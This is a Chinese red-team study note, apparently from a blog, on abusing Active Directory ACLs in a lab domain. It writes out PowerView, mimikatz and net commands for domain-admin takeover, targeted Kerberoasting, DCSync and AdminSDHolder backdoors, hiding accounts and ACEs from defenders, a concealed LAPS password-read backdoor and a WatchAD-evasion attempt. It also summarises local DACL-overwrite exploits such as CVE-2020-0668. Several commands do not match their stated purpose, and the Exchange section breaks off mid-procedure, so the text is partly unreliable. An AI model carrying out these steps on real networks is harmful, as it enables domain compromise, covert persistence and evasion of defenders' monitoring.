User用户的GenericAll权限\n\n使用zhangs账户和xxm账户做演示：\n\n两个账户的SID分别为：\n\n```\nzhangs:\nS-1-5-21-3305457972-2547556381-742707129-1604\nxxm:\nS-1-5-21-3305457972-2547556381-742707129-1105\n```\n\n这里使用zhangs账户，所在的主机是win2012，然后使用PowerView的函数Get-ObjectACL查看对zhangs具有GenericAll权限的项\n\n```\nGet-ObjectAcl -SamAccountName zhangs -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"}\n```\n\n![1574346548998](ACL学习记录.assets/1574346548998.png)\n\n在看一下xxm的\n\n```\nGet-ObjectAcl -SamAccountName xxm -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"}\n```\n\n![1574351798500](ACL学习记录.assets/1574351798500.png)\n\n然后在域控dc2012上设置xxm账户的DACL,添加对xxm的完全控制(GenericAll)权限：\n\n命令设置：\n\n```powershell\nAdd-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity xiaom -Rights ResetPassword -Verbose\n# 在zhangs的DACL中添加一条允许xiaom进行重置密码的ACE\n# powerviewer支持的类型'All', 'ResetPassword', 'WriteMembers', 'DCSync'\n```\n\n![1574351884195](ACL学习记录.assets/1574351884195.png)\n\n再在win2012上使用之前的命令查看ActiveDirectoryRights属性等于GenericAll的acl发现多了一条\n\n![1574351968816](ACL学习记录.assets/1574351968816.png)\n\n这条ACL的含义是：\n\n```\nzhangs账户对xxm账户具有完全管理(GenericAll)权限\n```\n\n在设置ACL之前和设置之后使用zhangs账户权限设置xxm账户的密码可以看到区别(设置完成之后会立即生效)\n\n```\nnet user xxm admin123! /domain\n```\n\n![1574352158367](ACL学习记录.assets/1574352158367.png)\n\n此时再使用已经修改的密码结合runas命令就可以直接创建一个xxm权限的cmd窗口：\n\n```\nrunas /noprofile /user:test\\xxm cmd\n```\n\n运行之后会弹出一个xxm权限的cmd窗口，即可使用xxm权限执行任意命令\n\n![1574352569785](ACL学习记录.assets/1574352569785.png)\n\n### GenericAll on Group\n\n环境和上文相同，并且已经删除了xxm账户中的ACE。GenericAll on Group说的是对一个组有GenericAll权限\n\n查看用户组domain admins\n\n```\nGet-NetGroup \"domain admins\"\n```\n\n![1574352888267](ACL学习记录.assets/1574352888267.png)\n\n此时zhangs和xxm均为域内普通权限用户，然后在域管理员组domain admins的DACL中加入zhangs的GenericAll权限\n\n命令行设置：\n\n```\nAdd-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity xiaom -Rights ResetPassword -Verbose\n```\n\n![1574433512298](ACL学习记录.assets/1574433512298.png)\n\n然后再win2012上使用命令查看domain admins的权限\n\n```\nGet-ObjectAcl -ResolveGUIDs| ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=test,DC=local\"}\n```\n\n可以看到在结果中有一条SID为zhangs的SID，权限为GenericAll\n\n![1574434341644](ACL学习记录.assets/1574434341644.png)\n\n然后尝试将xxm加入domain admins组：\n\n```\nnet group \"domain admins\" xxm /add /domain\n```\n\n可以看到已经成功将xxm加入管理员组,然后再删除了，之后将DACL中的内容删除之后再尝试加入，发现已经被拒绝。\n\n![1574434513186](ACL学习记录.assets/1574434513186.png)\n\n在zhangs具有这个权限的时候使用PowerSploit能够达到相同的目的\n\n```powershell\n# with active directory module\nAdd-ADGroupMember -Identity \"domain admins\" -Members xxm\n\n# with Powersploit\nAdd-NetGroupUser -UserName xxm -GroupName \"domain admins\" -Domain \"test.local\"\n```\n\n### GenericAll/GenericWrite/Write on Computer\n\n这个权限能够对Computer的属性进行改写，利用方式是结合Kerberos RDBC来进行攻击这个具有可写权限的计算机。比如此时对Win2012这台主机具有写权限，那么可以使用Powermad工具创建一个假的域内主机testrbcd，然后将Win2012主机的msDS-AllowedToActOnBehalfOfOtherIdentity字段设置为testrbcd$\n\n```powershell\nSet-ADComputer win2012 -PrincipalsAllowedToDelegateToAccount testrbcd$\n```\n\n然后使用Rubeus工具获取能够访问win2012特定SPN的票据。详情可见Kerberos委派之基于资源的约束委派文章。\n\n### WriteProperty on Group\n\nWriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限：\n\n```\n CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner\n```\n\n![1574560097806](ACL学习记录.assets/1574560097806.png)\n\n在Domain Admins组的列表中添加写入全部属性，会生成一条新的ACE\n\n![1574560158595](ACL学习记录.assets/1574560158595.png)\n\n访问被标记为特殊，没有实际显示具体权限，测试添加此条ACE前后：\n\n![1574560211929](ACL学习记录.assets/1574560211929.png)\n\n### Self (Self-Membership) on Group\n\n这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)\n\n![1574561144618](ACL学习记录.assets/1574561144618.png)\n\n添加完之后可以使用zhangs的权限将zhangs自身添加到Domain Admins组：\n\n```\nnet group \"domain admins\" zhangs /add /domain\n```\n\n![1574561300763](ACL学习记录.assets/1574561300763.png)\n\n### WriteProperty (Self-Membership)\n\nWriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限：\n\n![1578298388827](ACL学习记录.assets/1578298388827.png)\n\n然后使用zhangs账户权限可以将xxm账户加入Domain Admins组：\n\n```\nnet group \"domain admins\" xxm /add /domain\n```\n\n![1578298577041](ACL学习记录.assets/1578298577041.png)\n\n### Targeted Kerberoasting\n\nTargeted Kerberoasting是说在具有对目标账户的写权限时，通过设置目标账户的servicePrincipalName值，进行Kerberoasting攻击的方法。注意，攻击条件是：对目标账户具有WriteDacl或WriteOwner权限。（这里XXM为被爆破的账户，zhangs为攻击者）\n\n```\nGet-DomainUser -Identity xxm -Properties samaccountname,servicePrincipalName\nSet-DomainObject -Identity xxm -SET @{serviceprincipalname='Exchange/testwin7'}\nGet-DomainUser xxm | Get-DomainSPNTicket | fl\n```\n\n![1578229602420](ACL学习记录.assets/1578229602420.png)\n\n获取的hash值就可以使用hashcat或者是john进行爆破。在获取hash值之后可以使用命令将servicePrincipalName值清空：\n\n```\nSet-DomainObject -Identity xxm -Clear servicePrincipalName\n```\n\n### 针对域对象的后门\n\n上面所说的后门都是针对User Objects或者Group Objects的，这里要说的是针对Domain Objects。通过在Domain对象的DACL中添加ACE能够赋予用户特定的权限。因为实现这个操作需要较高权限，所以可以使用，这里使用powerviewer.ps1的Add-DomainObjectAcl函数实现：\n\n```\nAdd-DomainObjectAcl -TargetIdentity \"DC=test,DC=local\" -PrincipalIdentity zhangs -Rights DCSync\n```\n\n![1578299563009](ACL学习记录.assets/1578299563009.png)\n\n然后使用zhangs进行DCSync，这里可以看到添加前后的变化：\n\n```\n.\\mimikatz.exe \"lsadump::dcsync /user:test\\krbtgt\" \"exit\"\n```\n\n![1578299641064](ACL学习记录.assets/1578299641064.png)\n\n### 针对组策略对象的ACL\n\nGPO中的ACL同样能够进行权限维持等操作，修改SYSVOL的属性，意味着受托人可以修改GPO的设置。\n\n![1578303730837](ACL学习记录.assets/1578303730837.png)\n\n以域控组的组策略为例，可以在组策略管理中的委派选项中进行设置：\n\n![1578304668288](ACL学习记录.assets/1578304668288.png)\n\n![1578304812261](ACL学习记录.assets/1578304812261.png)\n\n创建之后在对应的GPO文件夹下可以看到对应的权限：\n\n![1578304920969](ACL学习记录.assets/1578304920969.png)\n\n## 相关工具\n\n### Powerview\n\nPowerview在上文的利用中也说过，对各种权限的设置可使用的函数可对应为：\n\n![1578305327522](ACL学习记录.assets/1578305327522.png)\n\n### Invoke-ACLPwn\n\n运行时需要.NET 3.5环境，Windows Server 2012安装遇到报错，最后的解决方法(需要在网上下载SxS的安装包https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：\n\n```powershell\ndism.exe /online /enable-feature /all /featurename:NetFX3 /Source:F:\\Sources\\SxS\\\n```\n\nGitHub地址：https://github.com/fox-it/Invoke-ACLPwn\n\n背景信息在发布者博客上：https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/\n\n环境需要：\n\n​\t.NET 3.5 + sharphound.exe + mimikatz.exe\n\n用法示例：\n\n```\n.\\Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -NoDCSync\n.\\Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe\n.\\Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -userAccountToPwn 'Administrator'\n.\\Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -LogToFile\n.\\Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -NoSecCleanup\n.\\Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'\n```\n\n使用第一条标识了-NoDCSync的命令：\n\n![1572402671046](ACL学习记录.assets/1572402671046.png)\n\n提示Got WriteDACL permissions.如果加上mimikatz.exe一起使用,可以看到直接获取了krbtgt的HASH值，也就是说已经可以直接生成黄金票据了：\n\n![1572430602702](ACL学习记录.assets/1572430602702.png)\n\n### NTLMRelay\n\n比如此前的Exchange的SSRF漏洞+NTLMRelay攻击，实际上有两种攻击方式\n\n1、ACL Attack：修改了域对象上的ACL，并向受攻击者控制的用户授予Replication-Get-Changes-All权限。这个权限能够进行DCSync。\n\n2、Group Attack：这种攻击发生在无法修改域ACL的情况下，如果无法修改ACL，则需要考虑将访问权添加到域中的几个高特权组中：\n\n```\nEnterprise Admins\nDomain Admins\nBackup Operators（可以备份域控制器上的关键文件）\nAccount Operators（可以控制域中几乎所有的组）\n```\n\n### RACE\n\nhttps://github.com/samratashok/RACE\n\nhttps://www.labofapenetrationtester.com/\n\n## 针对DACL的隐身方式\n\n### Hiding the Security Descriptor隐藏安全描述符\n\n这种方式是在文章https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf中看到的，其中介绍了隐藏安全描述符的方式：\n\n```\n1、将对象的所有者更改为攻击者控制的主体\n2、向目标对象添加一个拒绝Everyone的显式ACE\n```\n\n但是在测试中实际上发现这种方式没有成功：\n\n首先在用户xxm的账户中加入一条主体（受托人）为zhangs的GenericAll权限：\n\n![1578328137430](ACL学习记录.assets/1578328137430.png)\n\n此时zhangs账户能够修改xxm账户的密码：\n\n![1578328237219](ACL学习记录.assets/1578328237219.png)\n\n随后在原有DACL的基础上添加一条拒绝读取的ACE，主体为Everyone，类型为拒绝：\n\n![1578328397149](ACL学习记录.assets/1578328397149.png)\n\n此时发现即使是Test\\Administrator账户也已经无法看到DACL列表：\n\n![1578328479029](ACL学习记录.assets/1578328479029.png)\n\n但是再次使用命令进行修改密码时，发现被拒绝了，尽管此时xxm这个账户对象的所有者是zhangs账户。\n\n```\nnet user xxm admin123! /domain\n```\n\n![1578406554872](ACL学习记录.assets/1578406554872.png)\n\n也就是说添加了一条禁止读取的ACE，同时添加了一条允许完全控制权限的ACE，此时这条允许完全控制的ACE是不起作用的。所以这种方式我是实验失败了。\n\n### Hiding the Principal-隐藏主要的对象\n\n通过隐藏账户可以掩盖主体本身，阻止防御者轻易的发现谁实际上拥有ACE中指定的权限。\n\n#### 隐藏用户\n\n```\n1、将要隐藏的用户所有者改为攻击者或者攻击者控制的账户\n2、设置一条拒绝完全控制的ACE\n```\n\n![1578494104661](ACL学习记录.assets/1578494104661.png)\n\n点击应用之后所有用户都无法在外部访问查看此账户的ACL，包括administrator：\n\n```\nGet-DomainObjectAcl -Identity hideuser -domain test.local -Resolve\n```\n\n![1578494053578](ACL学习记录.assets/1578494053578.png)\n\n但是如上图所示，在ADSI编辑器中还是可以看到的，如果想要在ADSI编辑器中也看不到，那么就要将主体设置为用户本身，或者其他攻击者控制的账户：\n\n![1578494231804](ACL学习记录.assets/1578494231804.png)\n\n点击应用可以看到，即使在ADSI编辑器中也无法查询到：\n\n![1578494294845](ACL学习记录.assets/1578494294845.png)\n\n同时在AD用户和计算机中用户类型会变为未知：\n\n![1578494407808](ACL学习记录.assets/1578494407808.png)\n\n#### 隐藏OU中所有的子对象\n\n```\n直接添加一条拒绝Everyone的列出内容权限\n```\n\n![1578494954759](ACL学习记录.assets/1578494954759.png)\n\n然后再查看这个OU的时候会发现所有的用户都不显示。\n\n![1578494996863](ACL学习记录.assets/1578494996863.png)\n\n同样，通过powerviewer也无法查看ACL：\n\n![1578495045913](ACL学习记录.assets/1578495045913.png)\n\n## Backdoor\n\n### DCSync后门\n\n通商贸说的针对域对象的后门一样：\n\n使用powerviewer.ps1的Add-DomainObjectAcl函数实现：\n\n```\nAdd-DomainObjectAcl -TargetIdentity \"DC=test,DC=local\" -PrincipalIdentity zhangs -Rights DCSync\n```\n\n![1578299563009](ACL学习记录.assets/1578299563009.png)\n\n实际上执行之后会在域对象的DACL中添加一条对攻击者控制的账户的复制目录更改的ACE：\n\n![1578499853347](ACL学习记录.assets/1578499853347.png)\n\n然后使用zhangs进行DCSync，这里可以看到添加前后的变化：\n\n```\n.\\mimikatz.exe \"lsadump::dcsync /user:test\\krbtgt\" \"exit\"\n```\n\n![1578299641064](ACL学习记录.assets/1578299641064.png)\n\n注意，这里复制目录更改权限必须在域对象上添加，其他域内对象的权限列表中并没有这个权限。\n\n### AdminSDHolder\n\nAdminSDHolder会将自身的ACL列表每隔一个小时向受保护的组中同步，所以如果在AdminSDHolder中添加一个ACE作为后门，则受保护的组中将会一直被同步策略。受保护的组有https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN：\n\n![1578580704942](ACL学习记录.assets/1578580704942.png)\n\n在AdminSDHolder的DACL中设置一条受托人为zhangs，权限为完全控制的的ACE\n\n```\n$UserSid = Convert-NameToSid zhangs\nGet-DomainObjectAcl xxm -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $Userid}\nGet-DomainUser xxm -Properties objectsid,samaccountname,memberof | fl\nAdd-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=test,DC=local\" -PrincipalIdentity zhangs -Rights All\n```\n\n![1578572708953](ACL学习记录.assets/1578572708953.png)\n\n将zhangs这个用户对象的主体设置为其自身：\n\n```\n Get-DomainUser zhangs -Properties distinguishedname,memberof\n Set-DomainObjectOwner -Identity zhangs -OwnerIdentity zhangs\n Get-DomainUser -Identity zhangs -SecurityMasks owner\n```\n\n![1578572894639](ACL学习记录.assets/1578572894639.png)\n\n将对象从其所在的OU列表中隐藏，并为对象添加一条受托人为“Everyone”、权限为拒绝的ACE（这里就是上文提到的list_context权限）：\n\n此时无法看到zhangs账户，但是仍然能够查询到xxm账号中受托人为zhangs的ACE：\n\n```\n$UserSid = Convert-NameToSid zhangs\nGet-DomainObjectAcl xxm -ResolveGUIDs| ?{$_.SecurityIdentifier -eq $UserSid}\n```\n\n![1578574578649](ACL学习记录.assets/1578574578649.png)\n\n然后此时再zhangs用户权限下重置xxm账户密码创建一个xxm账户权限的cmd.exe\n\n```\n$SecPass = ConvertTo-SecureString 'pass123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity xxm -AccountPassword $SecPass -Verbose\nrunas /user:test\\xxm cmd.exe\n```\n\n![1578575547879](ACL学习记录.assets/1578575547879.png)\n\n实际上直接用net user也是可以的，因为此时zhangs有xxm的完全控制权限：\n\n```\nnet user xxm admin123! /domain\nrunas /user:test\\xxm cmd.exe\n```\n\n![1578575659800](ACL学习记录.assets/1578575659800.png)\n\n不过这样也有一个坏处就是所有的受保护组的ACL中都会被添加上这一条作为后门的ACE，隐藏其中一个账户并不能起到作用，所以感觉还是比较容易被发现的。\n\n在测试WatchAD的时候发现向System对象(AdminSDHolder的父对象)写入应用于所有后代的完全控制权限可以绕过WatchAD的限制。\n\n直接在域控上ADSI修改产生告警，使用powerview对AdminSDHolder进行添加ACL\n\n```\n. .\\pv.ps1\nAdd-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=test,DC=local\" -PrincipalIdentity xiaom -Rights All\n```\n\n测试结果发现特征被命中\n\n![image-20200424102901487](ACL学习记录.assets/image-20200424102901487.png)\n\n但是如果直接修改System不会命中，也不会触发5136事件。\n\n![image-20200424111802703](ACL学习记录.assets/image-20200424111802703.png)\n\n设置应用于这个对象及所有后代，修改时间为60s：\n\n```\nreg add hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60\n```\n\n60秒之后就可以使用xiaom权限添加任意文件到domain admins组\n\n```\n. .\\pv.ps1\nAdd-ADGroupMember -Identity \"domain admins\" -Members xiaom\n```\n\n![image-20200424112549123](ACL学习记录.assets/image-20200424112549123.png)\n\nhttp://www.selfadsi.org/extended-ad/ad-permissions-adminsdholder.htm\n\nhttps://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/\n\n本来以为是实验成功了，结果是因为AdminSDHoleder的ACL中的Everyone有个写入权限，导致了可以随意添加，乌龙。并且默认情况下AdminSDHoleder组是禁用继承的，要点击启用继承才行。\n\n![image-20200424143647930](ACL学习记录.assets/image-20200424143647930.png)\n\n点击之后父对象的ACE会同步到此对象，但是这样的话就会触发告警，直接修改Everyone的写权限依然会触发。\n\n### 关于LAPS的隐藏后门\n\nLADS的全称是Local Administrator Password Solution，主要作用是将域内主机的本地管理员密码存储在LDAP中，作为计算机账户的一个机密属性，配合GPO实现自动定期修改密码，设置密码长度、强度等。LAPS通过首先将Active Directory架构扩展为包括两个新字段ms-MCS-AdmPwd（密码本身）和  ms-MCS-AdmPwdExpirationTime（密码过期时）来完成其方法。\n\n具体的配置和如何查询明文密码可以参考：http://drops.xmd5.com/static/drops/tips-10496.html\n\n此时的环境：一个配置了LAPS的testwin7主机（属于testou）、一个域中的普通的测试账号zhangs\n\n![1578678284568](ACL学习记录.assets/1578678284568.png)\n\n此时通过命令查看testwin7主机的本地administrator密码：\n\n```\nGet-AdmPwdPassword –ComputerName testwin7\n```\n\n![1578677870018](ACL学习记录.assets/1578677870018.png)\n\n在zhangs登录的主机上使用LAPS UI尝试获取testwin7的本地密码没有成功：\n\n![1578677973824](ACL学习记录.assets/1578677973824.png)\n\n然后在testou中添加zhangs的读取密码的权限：\n\n```\nSet-AdmPwdReadPasswordPermission -Identity testou -AllowedPrincipals zhangs\n```\n\n此时再在zhangs主机上尝试获取testwin7密码:\n\n![1578678413373](ACL学习记录.assets/1578678413373.png)\n\n能够成功获取，但是此时的zhangs的权限是能够被观察到的：\n\n```\nFind-AdmPwdExtendedRights -Identity testou -IncludeComputers | fl\n```\n\n![1578678476882](ACL学习记录.assets/1578678476882.png)\n\n解决方法是在testou中新建一个msImaging-PSPs类型的对象testmspsps，此类容器的权限不能被Find-AdmPwdExtendedRights所遍历，同时将testwin7移动到testmspsps中，然后在testmspsps的ACL中设置受托人为zhangs的完全控制权限：\n\n![1578678792201](ACL学习记录.assets/1578678792201.png)\n\n![1578679073254](ACL学习记录.assets/1578679073254.png)\n\n此时在zhangs中就可以获取testwin7的密码，并且不会被Find-AdmPwdExtendedRights这个命令遍历到：\n\n![1578679133053](ACL学习记录.assets/1578679133053.png)\n\n![1578679172037](ACL学习记录.assets/1578679172037.png)\n\n这种方式的缺点在于需要移动域内主机所属的组。\n\n### Exchange上的利用\n\nzhangs   badguy\nxxm   patsy\n\n有权限的话，在xxm写一条受托人为zhangs的完全控制权限的ACE：\nAdd-DomainObjectAcl -TargetIdentity xxm -PrincipalIdentity zhangs -Rights All\n\n然后添加ACE到默认域控制器的GPO中\n$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity xxm -Right WriteDacl\n$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$TargetObject.PsBase.CommitChanges()\n\n在zhangs的权限下重置xxm的用户密码：\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n\n## 本地ACL相关漏洞\n\n```\nCVE-2018-8440\nhttps://cert.360.cn/report/detail?id=44669690fc7a8daab42472cebd8cfb88\nCVE-2019-1064\nhttps://www.rythmstick.net/posts/cve-2019-1064/\nCVE-2019-1069\nhttps://blog.0patch.com/2019/06/another-task-scheduler-0day-another.html\nhttps://www.thezdi.com/blog/2019/6/11/exploiting-the-windows-task-scheduler-through-cve-2019-1069\nCVE-2019-3582\nhttps://offsec.almond.consulting/mcafee-endpoint-security-arbitrary-file-write-eop.html\nCVE-2019-6177\nhttps://www.secpulse.com/archives/111592.html\nCVE-2019-0841\nhttps://cloud.tencent.com/developer/article/1552085\nCVE-2019-0863\nhttp://www.yidianzixun.com/article/0MecAAAd\nhttps://unit42.paloaltonetworks.com/tale-of-a-windows-error-reporting-zero-day-cve-2019-0863/\nGeekPwn 2016 Windows 服务提权漏洞的分析\nhttps://rekken.github.io/2017/07/23/Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability/\n```\n\n### Windows符号链接\n\n可以从低特权用户访问三种类型的符号链接：\n\n```\n对象管理器符号链接（Object Manager Symbolic Links）\n注册表项符号链接（Registry Key Symbolic Links）\nNTFS挂载点（NTFS Mount Points）\n```\n\n实际上，还有第四种类型，即NTFS符号链接（NTFS Symbolic Links），但是只有在您是管理员的情况下，才可以创建此类型，而对于特权提升却很少使用它们。\n\n### 硬链接\n\nmklink是Windows上自带的cmd命令，可以创建一个文件的链接文件。https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mklink\n\n```\nmklink testmd.txt a.txt\n```\n\n![image-20200408180315981](ACL学习记录.assets/image-20200408180315981.png)\n\n查看testmd.txt文件显示的是a.txt中的内容：\n\n![image-20200408180435105](ACL学习记录.assets/image-20200408180435105.png)\n\n同时被链接的对象可以是UNC路径：\n\n```\nmklink unc.txt \\\\win2012\\c$\\log.txt\n```\n\n![image-20200408180505461](ACL学习记录.assets/image-20200408180505461.png)\n\n### CVE-2014-6350\n\n[https://wooyun.js.org/drops/Internet%20Explorer%20EPM%E6%B2%99%E7%9B%92%E8%B7%B3%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%88CVE-2014-6350%EF%BC%89.html](https://wooyun.js.org/drops/Internet Explorer EPM沙盒跳出漏洞的分析（CVE-2014-6350）.html)\n\n\n\n### cve-2018-8440\n\n#### 简单原理：\n\n```\nSchRpcSetSecurity函数在win10中会检测C:\\Windows\\Tasks目录下是否存在后缀为.job的文件，如果存在则会写入DACL(写入的权限为高权限)数据。如果将job文件硬链接到特定的dll那么特定的dll就会被写入DACL数据，本来普通用户对特定的dll只具有读权限，这样就具有了写权限，接下来向dll写入漏洞利用代码并启动相应的程序就可以提权了。\n```\n\n分析文章：https://zhuanlan.zhihu.com/p/55020544\n\nhttps://cert.360.cn/report/detail?id=44669690fc7a8daab42472cebd8cfb88\n\n**什么是ALPC?**\nALPC（高级本地过程调用）是一种内部的，未记录的进程间通信工具，由Microsoft Windows NT内核提供，用于在同一台计算机上的进程之间进行轻量级的通信。\n\n#### 利用过程\n\n```\n1 将job后缀的文件硬链接到特定dll\n2 使用SchRpcSetSecurity函数来设置DACL\n3 调用SchRpcSetSecurity(“hardlink”,“sddl_string”,0)\n```\n\nPOC：\n\nhttps://github.com/sourceincite/CVE-2018-8440\n\nhttps://vulmon.com/vulnerabilitydetails?qid=CVE-2018-8440\n\n### CVE-2019-1064 AppXSVC\n\n原理：\n\n```\n当用户的AppData/Local/Packages下的任何文件夹结构被删除时，文件夹结构将由位于其下的二进制文件重新创建\nC:/WINDOWS/SystemApps/\n\n例：\n删除了\nC:/users/rythmstick/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy\n\n将通过调用重新创建文件夹结构来重新创建\nC:/Windows/SystemApps/Microsoft.Windows.Cortana_cw5n1h2txyewy/SearchIU.exe -ServerName:CortanaUI.AppXa....epj.mca\n\n在更新本地文件的DACL的时候使用的是NT AUTHORITY\\SYSTEM权限\n\n如果在删除文件之后，更新本地文件的DACL之前将一个硬链接放入此文件夹，那么就可以通过NT AUTHORITY\\SYSTEM权限来覆盖任何文件的DACL\n```\n\nPOC：\n\n```\nhttps://github.com/RythmStick/CVE-2019-1064\n```\n\n### cve-2019-1069计划任务\n\n原理：\n\nTask Scheduler以本地计算机定义的最大特权运行，即NT AUTHORITY \\ SYSTEM。\n\n```\n任务计划程序将任务作为文件存储在两个单独的位置。第一个C:\\Windows\\Tasks是旧位置。用于所有新任务的第二个位置是C:\\Windows\\System32\\Tasks。如果RPC客户端使用该服务来修改以的旧位置表示的任务，则C:\\Windows\\Tasks当该服务保存所做的修改时，该任务将被迁移到的首选位置C:\\Windows\\System32\\Tasks。\n\n将任务文件保存到首选位置时，服务将在文件上设置安全信息，以授予所有权和对任务所有者的完全控制权。至关重要的是，任务计划程序服务使用其自己的高度特权的SYSTEM令牌执行此操作。\n```\n\n漏洞分析：\n\nhttps://www.thezdi.com/blog/2019/6/11/exploiting-the-windows-task-scheduler-through-cve-2019-1069\n\n攻击步骤：\n\n```\n1.创建一个新任务。\n2.用指向任意目标文件的硬链接替换首选文件夹中的文件。\n3.手动将具有相同名称的新任务放入旧文件夹。\n4.使用任务计划程序RPC界面将任务迁移到首选文件夹。Task Scheduler服务将更新首选文件夹中文件的安全性信息，将所有权和完全控制权授予攻击者。由于此文件实际上是硬链接，因此此安全信息将应用于目标文件。\n```\n\n\n\n### CVE-2019-6177 Lenovo\n\n同样是一个DACL复写漏洞\n\n```\n联想的 LSC安装后，会在计划任务中的\\Lenovo\\Lenovo Solution Center Launcher加一个任务， 该任务会在login事件后10分钟运行LSC.Services.UpdateStatusService.exe二进制文件。\n\n二进制文件会覆写C:\\ProgramData\\Lenovo\\LSC\\log\\目录的所有文件的DACL，给认证用户组（Authenticated Users）中的所有成员完全访问权限。所以Authenticated Users中的所有成员都会有这些文件的访问权限。\n\n使用硬链接复写以System权限运行的进程加载的DLL的DACL，然后用shellcode复写DLL，并触发进程。\n```\n\n### CVE-2019-0863 WER\n\nWindows错误报告（WER，Windows error report）\n\n原理：\n\n```\nwermger.exe逐一解析报告目录中的所有文件，将这些文件提交给微软\n当wermger.exe检测到损坏的Report.werINI文件，就会删除该文件。而wermger.exe首先会修改该文件的DACL属性，再删除该文件\nwermger.exe在读取文件DACL属性以及添加删除权限之间存在多个一个时间窗口，攻击者利用的正是这个时间窗口。如果攻击者创建此类文件与系统上其他任意文件的一个链接，那么在读取DACL之后，wermgr.exe会错误地修改其他文件的DACL。\n```\n\nhttps://xz.aliyun.com/t/5571\n\n### cve-2019-0841\n\nhttp://blog.nsfocus.net/cve-2019-0841-dacl/\n\n### CVE-2020-0668\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Tracing 注册表项任意用户（Everyone）可写可读，Tracing注册表项主要用于Windows服务跟踪调试，调试过程中会以SYSTEM权限产生一个日志文件：\n```\n\n![image-20200413214228387](ACL学习记录.assets/image-20200413214228387.png)\n\n其中：`FileDirectory` 项主要用于设置日志产生的目录，经过作者分析发现，日志文件名不可控、日志内容更不可控，其次，当日志文件大小超过了`MaxFileSize`时，会将文件重命名到当前目录，扩展名改为OLD。\n\n利用流程：\n\n1、创建（或复制）一个大小大于0x8000（32,768）字节的文件。\n2、创建一个新目录（C:\\EXPLOIT\\mountpoint\\例如）并将其设置为的挂载点\\RPC Control。\n\n3、创建以下符号链接：\n\n```\n\\RPC Control\\RASTAPI.LOG -> \\??\\C:\\EXPLOIT\\FakeDll.dll (owner = current user)\n\\RPC Control\\RASTAPI.OLD -> \\??\\C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll\n```\n\n4、在注册表中配置以下值：\n\n```\nFileDirectory = C:\\EXPLOIT\\mountpoint\nMaxFileSize = 0x8000 (32,768‬ bytes)\nEnableFileTracing = 1\n```\n\n5、使用RasDialWindows API中的函数触发与RASTAPI相关的事件\n6、触发Update Session Orchestrator服务以NT AUTHORITY\\SYSTEM权限加载DLL \n\n### CVE-2020-1317：Windows组策略中的漏洞\n\nhttps://www.anquanke.com/post/id/208437#h2-4\n\n### GeekPwn\n\nhttps://rekken.github.io/2017/07/23/Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability/","categories":["RedTeam&域安全"]}]